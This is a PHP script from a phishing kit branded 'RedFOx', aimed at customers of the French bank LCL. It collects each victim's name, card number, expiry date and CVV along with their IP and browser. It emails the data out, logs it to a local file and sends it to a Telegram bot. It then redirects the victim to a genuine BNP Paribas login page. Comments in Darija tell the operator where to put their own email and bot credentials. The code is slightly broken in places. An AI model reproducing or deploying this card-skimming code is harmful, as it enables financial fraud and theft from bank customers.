<?php

	$subj  = " LCL Resultats||".$ip."\n";
					$to= 'red@example.com'; //Dir Email dyalek hnaya
					$head .= "MIME-Version: 1.0\r\n";
					$head .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
					@mail($to, $subj, $mail, $head);
		        	$text  = "|====================[ RedFOx LCL ]================|\n";
		        	$text .= "|====================[ USER INFORMATION ]|\n"; 
					$text .= getenv ("HTTP_USER_AGENT");
					$text .= getenv("REMOTE_ADDR");
		        	$text .= "|====================[ Carte bancaire INFORMATION ]|\n"; 
					$text .= "|Nom et prenom   :  " .$_POST["pnam"]."\n";
					$text .= "|N° de carte bancaire  :  " .$_POST["nc"]."\n";
					$text .= "|Expiration :  " .$_POST["dtn"]."\n";
					$text .= "|CVV :  " .$_POST["cvv"]."\n";
					$text .= "|====================[ RedFOx LCL ]================|\n";
					$text .= "\n";
					$text .= "\n";
					$result = fopen("ResultatFinal.txt", "a");   
					fwrite($result, $text);
					




function redfoxid ($chat_id, $METRI_TOKEN,$text,$to,$result,$mail = null){
		$mail = "
			<!DOCTYPE html><html lang='en'><head></head><body>
			<section style='font-size: 13px;font-family:monospace;font-weight:700;'><pre>
			################ <font style='color: #820000;'>&#x2620; RedFOx &#x2620;</font> ################
			===============[ <font style='color: #0a5d00;'>Carte bancaire  INFORMATION</font> ]
			<font style='color:#9c0000;'>&#x272A;</font> name   = <span style='color:#0070ba;'>".$_POST["pnam"]."</span>
			<font style='color:#9c0000;'>&#x272A;</font> N° de carte   = <span style='color:#0070ba;'>".$_POST["nc"]."</span>
			<font style='color:#9c0000;'>&#x272A;</font> expiration   = <span style='color:#0070ba;'>".$_POST["dtn"]."</span>
			<font style='color:#9c0000;'>&#x272A;</font> CVV    = <span style='color:#0070ba;'>".$_POST["cvv"]."</span>
			===============
			
			[ <font style='color: #0a5d00;'>USER INFORMATION</font> ]
			<font style='color:#9c0000;'>&#x272A;</font> SYSTEME = <span style='color:#0070ba;'>".getenv("HTTP_USER_AGENT")."</span>
			<font style='color:#9c0000;'>&#x272A;</font> BROWSER = <span style='color:#0070ba;'>".getenv("REMOTE_ADDR")."</span>
			<font style='color:#9c0000;'>&#x272A;</font> IP INFO = <a style='color:#0070ba;' href='https://geoiptool.com/en/?ip=".getenv("REMOTE_ADDR")."' target='_blank'>`
			</a>
			
			
			################ <font style='color: #820000;'>&#x2620; RedFOx &#x2620;</font> ################
			</pre></section></body></html>\n";
			
			
				
					
					$tokenlink = "XXXXXXXXXXXXXXXXXXXX" . $METRI_TOKEN;  //Dir Boot Hnaya 
					
					
            $params=[
            'chat_id'=>XXXXXXXXXXXX,  //Dir chat Id Hnaya 
            'text'=>$text,
            ];
            
			
			
			$ch = curl_init($tokenlink . '/sendMessage');
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result = curl_exec($ch);
            curl_close($ch);
		}
header('location:https://connexion-mabanque.bnpparibas/login');















?>